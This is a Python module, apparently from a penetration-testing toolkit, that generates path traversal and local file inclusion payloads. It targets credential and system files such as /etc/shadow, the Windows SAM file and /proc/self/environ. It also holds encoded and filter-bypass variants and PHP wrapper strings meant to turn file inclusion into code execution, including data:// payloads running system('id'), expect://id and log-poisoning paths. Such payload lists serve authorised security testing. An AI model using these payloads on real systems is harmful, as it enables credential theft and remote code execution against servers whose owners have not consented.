"""
AIPT Path Traversal Payloads

Directory traversal / LFI payloads for security testing.
"""
from __future__ import annotations

from typing import Iterator
from urllib.parse import quote


class PathTraversalPayloads:
    """
    Path traversal payload generator.

    Categories:
    - Basic: ../../../etc/passwd
    - Encoded: URL encoding, double encoding
    - Filter bypass: Null bytes, wrappers
    - Windows: ..\\..\\..\\windows\\win.ini

    Example:
        traversal = PathTraversalPayloads()
        for payload in traversal.linux():
            test(f"/read?file={payload}")
    """

    # Common target files
    LINUX_FILES = [
        "/etc/passwd",
        "/etc/shadow",
        "/etc/hosts",
        "/etc/hostname",
        "/proc/self/environ",
        "/proc/version",
        "/var/log/apache2/access.log",
        "/var/log/nginx/access.log",
    ]

    WINDOWS_FILES = [
        "C:\\Windows\\win.ini",
        "C:\\Windows\\System32\\config\\SAM",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "C:\\boot.ini",
    ]

    @classmethod
    def linux(cls, depth: int = 10) -> Iterator[str]:
        """Linux path traversal payloads"""
        traversal = "../" * depth

        for file in cls.LINUX_FILES:
            # Basic
            yield f"{traversal}etc/passwd"
            yield f"{traversal}{file.lstrip('/')}"

            # With null byte (PHP < 5.3.4)
            yield f"{traversal}etc/passwd%00"
            yield f"{traversal}etc/passwd\x00"

            # Absolute path
            yield file

    @classmethod
    def windows(cls, depth: int = 10) -> Iterator[str]:
        """Windows path traversal payloads"""
        traversal_forward = "../" * depth
        traversal_back = "..\\" * depth

        for file in cls.WINDOWS_FILES:
            yield f"{traversal_forward}windows/win.ini"
            yield f"{traversal_back}windows\\win.ini"
            yield file

    @classmethod
    def encoded(cls) -> Iterator[str]:
        """Encoded path traversal payloads"""
        payloads = [
            # URL encoding
            "%2e%2e%2f" * 5 + "etc/passwd",
            "%2e%2e/" * 5 + "etc/passwd",
            "..%2f" * 5 + "etc/passwd",

            # Double URL encoding
            "%252e%252e%252f" * 5 + "etc/passwd",

            # UTF-8 encoding
            "..%c0%af" * 5 + "etc/passwd",
            "..%c1%9c" * 5 + "etc/passwd",

            # 16-bit Unicode
            "%u002e%u002e%u002f" * 5 + "etc/passwd",

            # Overlong UTF-8
            "..%c0%ae/" * 5 + "etc/passwd",
        ]
        yield from payloads

    @classmethod
    def filter_bypass(cls) -> Iterator[str]:
        """Filter bypass techniques"""
        payloads = [
            # Double dots
            "....//....//....//etc/passwd",
            "..../..../..../etc/passwd",

            # Mixed slashes
            "..\\../..\\../etc/passwd",
            "..//..//..//etc/passwd",

            # With current directory
            "./.././.././../etc/passwd",
            ".//..//./..//etc/passwd",

            # Absolute with traversal
            "/var/www/../../etc/passwd",

            # Path truncation (old systems)
            "../" * 100 + "etc/passwd",

            # Windows UNC paths
            "\\\\localhost\\c$\\windows\\win.ini",
            "//localhost/c$/windows/win.ini",
        ]
        yield from payloads

    @classmethod
    def php_wrappers(cls) -> Iterator[str]:
        """PHP wrapper payloads (LFI to RCE)"""
        payloads = [
            # php://filter for source code disclosure
            "php://filter/convert.base64-encode/resource=index.php",
            "php://filter/read=string.rot13/resource=index.php",
            "php://filter/convert.iconv.utf-8.utf-16/resource=index.php",

            # php://input (requires POST)
            "php://input",

            # data:// wrapper
            "data://text/plain,<?php system('id');?>",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==",

            # expect:// wrapper
            "expect://id",

            # phar:// wrapper
            "phar://uploads/avatar.jpg/test.php",

            # zip:// wrapper
            "zip://uploads/archive.zip#shell.php",

            # Log poisoning
            "/var/log/apache2/access.log",
            "/var/log/apache2/error.log",
            "/proc/self/fd/0",
        ]
        yield from payloads

    @classmethod
    def all(cls) -> Iterator[str]:
        """All path traversal payloads"""
        yield from cls.linux()
        yield from cls.windows()
        yield from cls.encoded()
        yield from cls.filter_bypass()
        yield from cls.php_wrappers()
